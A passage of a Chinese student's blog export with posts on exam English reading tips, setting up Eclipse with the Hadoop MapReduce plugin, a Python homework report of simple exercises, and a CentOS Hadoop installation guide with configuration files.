<p>文章首先出现带有“冲突”色彩的单词，带着“是什么冲突”问题往下读，寻找答案</p>
<p>段的关系：        立论    -&gt;    驳论</p>
<p><em>（我可能脑子不太好，不能表达我想说的）</em></p>
<p>无法说清的思想：</p>
<p>16 text2中：</p>
<p>在乡村盖房   =    破坏农村</p>
<p>在乡村盖房 不是对城市存在偏见，反而是为了保护城市特点特色</p>
<h3 id="出题人"><a href="#出题人" class="headerlink" title="出题人"></a>出题人</h3><p>1.拼凑</p>
<p>2.正话反说</p>
<p>3.将支持句作为选项之一进行迷惑</p>
<p>4.时间上的对比</p>
<p>5.正确选项中如果有删除单词或短语，但如果未影响到文章主旨，可忽略</p>
<p>6.替换词组</p>
<p>7.考研文章有些是出题人将外刊原文进行删减后作为考研题目</p>
<p>8.出题人不可能在同一个地方出题，但可能在同一句话出题</p>
<h3 id="作者经常行为"><a href="#作者经常行为" class="headerlink" title="作者经常行为"></a>作者经常行为</h3><p>替换词组</p>
<p>先赞成对方观点，然后提出质疑（引用科学报告。。。。），然后说不对，最后提出自己观点</p>
<h3 id="自我总结"><a href="#自我总结" class="headerlink" title="自我总结"></a>自我总结</h3><p>1.长难句分析太慢，经常忘记看主、所造成的结果、有什么、指的什么</p>
<p>2.自己真题解析式，找到原文进行参考思考（出题人删了什么、为什么删）</p>
<p>3.注意形容词、动词的情绪（关乎作者态度）</p>
<p>4.注意作者在举例时，句子中出现的，like、as well。。。。。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>英语</category>
        <category>陈仲凯老师</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>eclipse-mapreduce-hadoop</title>
    <url>/2020/11/20/eclipse-mapreduce-hadoop/</url>
    <content><![CDATA[<h3 id="hadoop三节点配置方案"><a href="#hadoop三节点配置方案" class="headerlink" title="hadoop三节点配置方案"></a>hadoop三节点配置方案</h3><p>pass</p>
<h3 id="eclipse配置mapreduce"><a href="#eclipse配置mapreduce" class="headerlink" title="eclipse配置mapreduce"></a>eclipse配置mapreduce</h3><h4 id="配置前的准备"><a href="#配置前的准备" class="headerlink" title="配置前的准备"></a>配置前的准备</h4><p>下载相关文件</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/clip_image002.jpg">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120210007946.png">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120210042940.png">

<p><strong>注意</strong>：箭头所指的ppt可下载下来进行对照配置，方框所指的文件为后续所需要的文件。</p>
<h4 id="启动eclipse并添加mapreduce插件"><a href="#启动eclipse并添加mapreduce插件" class="headerlink" title="启动eclipse并添加mapreduce插件"></a>启动eclipse并添加mapreduce插件</h4><h5 id="1-在Windows中解压eclipse-java-2019-03-R-linux-gtk-x86-64-tar-gz"><a href="#1-在Windows中解压eclipse-java-2019-03-R-linux-gtk-x86-64-tar-gz" class="headerlink" title="1.在Windows中解压eclipse-java-2019-03-R-linux-gtk-x86_64.tar.gz"></a>1.在Windows中解压<code>eclipse-java-2019-03-R-linux-gtk-x86_64.tar.gz</code></h5><p>并确定文件内容是否完整</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120210418200.png">

<h5 id="2-将eclipse文件夹拖入centos中（最好放在桌面）并确认文件夹内容是否完整"><a href="#2-将eclipse文件夹拖入centos中（最好放在桌面）并确认文件夹内容是否完整" class="headerlink" title="2.将eclipse文件夹拖入centos中（最好放在桌面）并确认文件夹内容是否完整"></a>2.将eclipse文件夹拖入centos中（最好放在桌面）并确认文件夹内容是否完整</h5><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120210624532.png">

<p><strong>注意</strong>：之所以<code>.eclipseproduct</code>没看到，是因为以<code>.</code>开头的文件为隐藏文件</p>
<h5 id="3-将事先下载好的hadoop-eclipse-plugin-2-6-0-jar文件拖入eclipse文件夹的dropins文件夹中"><a href="#3-将事先下载好的hadoop-eclipse-plugin-2-6-0-jar文件拖入eclipse文件夹的dropins文件夹中" class="headerlink" title="3.将事先下载好的hadoop-eclipse-plugin-2.6.0.jar文件拖入eclipse文件夹的dropins文件夹中"></a>3.将事先下载好的<code>hadoop-eclipse-plugin-2.6.0.jar</code>文件拖入<code>eclipse</code>文件夹的<code>dropins</code>文件夹中</h5><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120210930397.png">



<h5 id="4-运行eclipse"><a href="#4-运行eclipse" class="headerlink" title="4.运行eclipse"></a>4.运行eclipse</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master eclipse]<span class="comment"># ./eclipse</span></span><br></pre></td></tr></table></figure>

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120211939140.png">

<p><strong>注意</strong>：箭头所指的地方，用默认已出现的路径就ok</p>
<h5 id="5-添加mapreduce插件"><a href="#5-添加mapreduce插件" class="headerlink" title="5.添加mapreduce插件"></a>5.添加mapreduce插件</h5><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120212208424.png">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120212227296.png">

<p>并添加hadoop的路径</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120212845862.png">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120212909560.png">

<p><strong>注意</strong>：<code>/usr/local/src/hadoop</code>为个人hadoop路径</p>
<h5 id="6-添加mapreduce项目"><a href="#6-添加mapreduce项目" class="headerlink" title="6.添加mapreduce项目"></a>6.添加mapreduce项目</h5><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120212341742.png">



<p>双击下方图像中箭头所指的插件名称</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120212633046.png">

<p>下方箭头所指的文件名可以随便取</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120212610818.png">



<h5 id="7-打开mapreduce的窗口"><a href="#7-打开mapreduce的窗口" class="headerlink" title="7.打开mapreduce的窗口"></a>7.打开mapreduce的窗口</h5><src img="https://ckcah.github.io/eclipse-mapreduce/image-20201120213202087.png">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120213228220.png">

<p>可以看到mapreduce窗口</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120213317365.png">



<h5 id="8-启动master节点（一个就好）"><a href="#8-启动master节点（一个就好）" class="headerlink" title="8.启动master节点（一个就好）"></a>8.启动master节点（一个就好）</h5><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120213448320.png">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120213607067.png">

<p><strong>注意</strong>：记得用<code>root</code>账户执行该命令</p>
<p><code>jps</code>查看运行结果</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120213652526.png">

<h5 id="9-使用eclipse连接节点"><a href="#9-使用eclipse连接节点" class="headerlink" title="9.使用eclipse连接节点"></a>9.使用eclipse连接节点</h5><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120213734455.png">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120213835618.png">

<p><code>1</code>：随便写的名字</p>
<p><code>2</code>：主机的名字，也可以写127.0.0.1</p>
<p><code>3</code>：固定写50070</p>
<p><code>4</code>：参考<code>hadoop</code>目录下<code>etc/hadoop/</code>目录下的<code>core-site.xml</code>文件中的<code>&lt;value&gt;hdfs://master:9000&lt;/value&gt;</code></p>
<p><code>5</code>：user name为hadoop运行时的权限用户</p>
<h5 id="10-加载完后，my-hadoop会加载出之前创建的input、output文件夹"><a href="#10-加载完后，my-hadoop会加载出之前创建的input、output文件夹" class="headerlink" title="10.加载完后，my hadoop会加载出之前创建的input、output文件夹"></a>10.加载完后，my hadoop会加载出之前创建的<code>input</code>、<code>output</code>文件夹</h5><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120215347257.png">

<p>如果没有，建议打开终端执行以下两条命令（记得用root执行命令）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master hadoop]<span class="comment"># hdfs dfs -mkdir /input</span></span><br><span class="line">[root@master hadoop]<span class="comment"># hdfs dfs -mkdir /output</span></span><br></pre></td></tr></table></figure>

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120215837928.png">

<p>之所以这里报错，是因为我已经创建了这个文件夹</p>
<h4 id="创建wordcount项目"><a href="#创建wordcount项目" class="headerlink" title="创建wordcount项目"></a>创建wordcount项目</h4><p><strong>前提</strong>：Windows中的文件能够直接复制粘贴到centos中</p>
<p>点击<code>WordCount.java</code>，右击复制</p>
<p>返回centos中，进入eclipse，进行粘贴</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120221341360.png">

<p>修改<code>WordCount.java</code></p>
<p>1.删除该串代码</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120221628985.png">



<p>2.修改该串代码</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120221711337.png">

<p>修改后：</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120225739412.png">

<h4 id="上传dream-txt"><a href="#上传dream-txt" class="headerlink" title="上传dream.txt"></a>上传<code>dream.txt</code></h4><p>将事先下载到windows中的dream.txt复制到centos桌面</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120222838526.png">

<p>使用终端上传至hadoop中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master Desktop]<span class="comment"># hdfs dfs -put dream.txt /input/dream.txt</span></span><br></pre></td></tr></table></figure>

<p>刷新eclipse的my Hadoop节点，查看文件</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120223135672.png">



<h4 id="运行WordCount-java"><a href="#运行WordCount-java" class="headerlink" title="运行WordCount.java"></a>运行<code>WordCount.java</code></h4><p>点击进入WordCount.java，并进行下图操作</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120223627162.png">

<p>配置输入输出文件</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120223719324.png">

<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120223747622.png">



<p>将<code>log4j.properties</code>复制到src中</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120223942190.png">



<p>完成</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120224012523.png">



<p>复制<code>hadoop</code>路径下的<code>etc/hadoop</code>路径下的<code>core-site.xml</code>、<code>hdfs-site.xml</code>到<code>src</code>中</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120225832279.png">

<p>运行<code>WordCount.java</code></p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120230128228.png">



<p>完成</p>
<src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120230219523.png">

<h4 id="检验是否成功，可查看output文件是否生成对应的文档"><a href="#检验是否成功，可查看output文件是否生成对应的文档" class="headerlink" title="检验是否成功，可查看output文件是否生成对应的文档"></a>检验是否成功，可查看output文件是否生成对应的文档</h4><src img="https://ckcah.github.io/images/eclipse-mapreduce/image-20201120230355752.png">

</src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src></src><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>python-04_实验报告-2</title>
    <url>/2020/10/12/python-04-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A-2/</url>
    <content><![CDATA[<h5 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h5><p>任务说明：找出所有的水仙花先。水仙花数是指一个三位数，它的每个位上的数字3次方之和等于它本身（例如，1<strong>3+5</strong>3+3**3 = 153）。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line"></span><br><span class="line">        a = i // <span class="number">100</span></span><br><span class="line"></span><br><span class="line">        b = (i % <span class="number">100</span>) // <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        c = i % <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a * a * a + b * b * b + c * c * c == i):</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">test1()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<img src="https://ckcah.github.io/images/homework/python/1.png">

<h5 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h5><p>任务说明：利用循环语句打印出九九乘法表。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%d*%d=%d&quot;</span> % (i, j, i * j), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">test2()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<img src="https://ckcah.github.io/images/homework/python/2.png">

<h5 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h5><p>任务说明: 找出1000以内所有的完全数。完全数是一些特殊的自然数，它的所有真因子（除自身以外的因子）的和恰好等于它本身（例如，6=1+2+3）。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test3</span>():</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i):</span><br><span class="line">            <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">                s += j</span><br><span class="line">        <span class="keyword">if</span> s == i:</span><br><span class="line">            result.append(<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1000以内的完全数有：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(test3()))</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<img src="https://ckcah.github.io/images/homework/python/3.png">

<h5 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h5><p>任务说明：无穷级数 4/1-4/3+4/5-4/7+….的和是圆周率π。</p>
<p>（1）请写一个程序计算出这一级前n项的和。</p>
<p>（2）请利用该多项式求出误差小于10-6的圆周率π，真实值π可以使用math.PI。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test4</span>():</span></span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入一个n值:&quot;</span>))</span><br><span class="line">    pi = <span class="number">0.0</span></span><br><span class="line">    fuhao = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">        <span class="keyword">if</span> fuhao == <span class="number">1</span>:</span><br><span class="line">            pi += (<span class="number">1</span> / ((i * <span class="number">2</span>) - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pi -= (<span class="number">1</span> / ((i * <span class="number">2</span>) - <span class="number">1</span>))</span><br><span class="line">        <span class="comment">#print(4 * pi)</span></span><br><span class="line">        PI = <span class="number">4</span> * pi</span><br><span class="line">        fuhao = fuhao * -<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> (PI)</span><br><span class="line">test4()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<img src="https://ckcah.github.io/images/homework/python/4.png">

<h5 id="任务五"><a href="#任务五" class="headerlink" title="任务五"></a>任务五</h5><p>素数求和</p>
<p>任务说明：找出300以内的所有素数，并对它们求和。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test5</span>():</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">300</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        v = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, i):</span><br><span class="line">            <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">                v = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> v:</span><br><span class="line">            <span class="built_in">sum</span> += i</span><br><span class="line">            value += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(value, <span class="built_in">sum</span>)</span><br><span class="line">test5()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<img src="https://ckcah.github.io/images/homework/python/5.png">

<h5 id="任务六"><a href="#任务六" class="headerlink" title="任务六"></a>任务六</h5><p>斐波那契数列</p>
<p>任务说明：斐波那契数列指的是这样一个数列：1,1,2,3,5,8,13,21，…..。这个数列从第3项开始，每一项都等于前两项之和，请编程实现输出该数列的前n项。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test6</span>():</span></span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入一个正整数:&quot;</span>))</span><br><span class="line"></span><br><span class="line">    n1 = <span class="number">1</span></span><br><span class="line">    n2 = <span class="number">1</span></span><br><span class="line">    count = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;斐波那契数列：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(n1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;斐波那契数列：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(n1, <span class="string">&quot;,&quot;</span>, n2, end=<span class="string">&quot; , &quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> count &lt; n:</span><br><span class="line">            nth = n1 + n2</span><br><span class="line">            <span class="built_in">print</span>(nth, end=<span class="string">&quot; , &quot;</span>)</span><br><span class="line">            <span class="comment"># 更新值</span></span><br><span class="line">            n1 = n2</span><br><span class="line">            n2 = nth</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">test6()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<img src="https://ckcah.github.io/images/homework/python/6.png">

<h5 id="任务七"><a href="#任务七" class="headerlink" title="任务七"></a>任务七</h5><p>猜数游戏</p>
<p>任务说明：在程序中随机生成一个0〜9之间（包含0和9）的随机整数T，让用户通过键盘输入所猜的数。如果输入的数大于T显示“遗憾，太大了”；如果输入小于T显示“遗憾，太小了”；如此循环，直至猜中该数，显示“猜了N次，你猜中了”, 其中N是指用户在这次游戏中猜中该随机数一共尝试的次数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test7</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    a = random.randrange(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入所猜的数:&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> a &gt; b:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;遗憾，太大了&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> a &lt; b:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;遗憾，太小了&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;猜了%d次，你猜中了&quot;</span> % i)</span><br><span class="line">test7()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<img src="https://ckcah.github.io/images/homework/python/7.png"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>homework</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop搭建过程（踩坑版）</title>
    <url>/2020/10/11/hadoop%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%EF%BC%88%E8%B8%A9%E5%9D%91%E7%89%88%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>Centos7 + hadoop2.6.0 + jdk1.8.0_261 + ssh</p>
<p>推荐工具：vmware虚拟机、winscp.exe、putty.exe</p>
<p>我把所有的文件都分享到了百度网盘，需要的朋友可以下载.</p>
<h2 id="主线"><a href="#主线" class="headerlink" title="主线"></a>主线</h2><h3 id="jdk1-8"><a href="#jdk1-8" class="headerlink" title="jdk1.8"></a>jdk1.8</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>将jdk文件下载好后，移动至linux下（你想要保存的路径下）</p>
<img src="https://ckcah.github.io/images/homework/hadoop/1.png">

<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>putty.exe连接centos</p>
<hr>
<img src="https://ckcah.github.io/images/homework/hadoop/2.png">

<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>进入centos后，更改环境配置</p>
<img src="https://ckcah.github.io/images/homework/hadoop/3.png">

<img src="https://ckcah.github.io/images/homework/hadoop/4.png">

<p>注意红框的地方，就是0x01中，你将jdk放入的地方</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/src/jdk1.8.0_261</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre/lib/rt.jar:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib/dt.jar:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib/tools.jar</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin</span><br></pre></td></tr></table></figure>

<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><p>验证是否成功</p>
<img src="https://ckcah.github.io/images/homework/hadoop/5.png">

<h3 id="ssh配置"><a href="#ssh配置" class="headerlink" title="ssh配置"></a>ssh配置</h3><p><strong>原理</strong>：Hadoop运行过程中需要管理远端Hadoop守护进程，在Hadoop启动以后，NameNode是通过SSH（Secure Shell）来启动和停止各个DataNode上的各种守护进程的。这就必须在节点之间执行指令的时候是不需要输入密码的形式，故我们需要配置SSH运用无密码公钥认证的形式，这样NameNode使用SSH无密码登录并启动DataName进程，同样原理，DataNode上也能使用SSH无密码登录到NameNode.</p>
<h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ssh-keygen</span></span><br></pre></td></tr></table></figure>



<img src="https://ckcah.github.io/images/homework/hadoop/6.png">

<h4 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h4><p>更改文件的权限（这一步我觉得无所谓，但是，安全起见，还是把.ssh文件夹改为700，authorized_keys文件改为600比较好）</p>
<img src="https://ckcah.github.io/images/homework/hadoop/7.png">



<h4 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h4><p>验证ssh登陆不需要密码</p>
<img src="https://ckcah.github.io/images/homework/hadoop/8.png">

<h3 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h3><h4 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h4><p>将hadoop文件（确保完整性）复制到centos7中</p>
<img src="https://ckcah.github.io/images/homework/hadoop/9.png">

<h4 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h4><p>配置hadoop环境</p>
<p><code>vim /etc/profile</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> HADOOP_HOME=/usr/<span class="built_in">local</span>/src/hadoop</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HADOOP_HOME</span>/bin:<span class="variable">$HADOOP_HOME</span>/sbin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/homework/hadoop/10.png">

<h4 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h4><p>验证hadoop环境是否配置好</p>
<img src="https://ckcah.github.io/images/homework/hadoop/11.png">

<h4 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h4><p>更改配置文件：core-site.xml、hdfs-site.xml、mapred-site.xml(这个文件如果没有，那就复制<code>mapred-site.xml.template</code>并改名为<code>mapred-site.xml</code>“&gt;、yarn-site.xml、slaves</p>
<p>（路径为/usr/local/src/hadoop/etc/hadoop/）</p>
<h5 id="core-site-xml"><a href="#core-site-xml" class="headerlink" title="core-site.xml"></a>core-site.xml</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">        &lt;name&gt;fs.defaultFS&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;hdfs://hadoop:8020&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">        &lt;name&gt;hadoop.tmp.dir&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;/usr/<span class="built_in">local</span>/src/hadoop/tmp&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：</p>
<img src="https://ckcah.github.io/images/homework/hadoop/12.png">

<p>标识1：这个路径是你hadoop的路径，也和你的环境变量路径应该是一样的</p>
<p>标识2：这个文件需要你在hadoop路径下创建（无需考虑权限问题）</p>
<h5 id="hdfs-site-xml"><a href="#hdfs-site-xml" class="headerlink" title="hdfs-site.xml"></a>hdfs-site.xml</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">        &lt;name&gt;dfs.replication&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h5 id="mapred-site-xml"><a href="#mapred-site-xml" class="headerlink" title="mapred-site.xml"></a>mapred-site.xml</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.framework.name&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;yarn&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

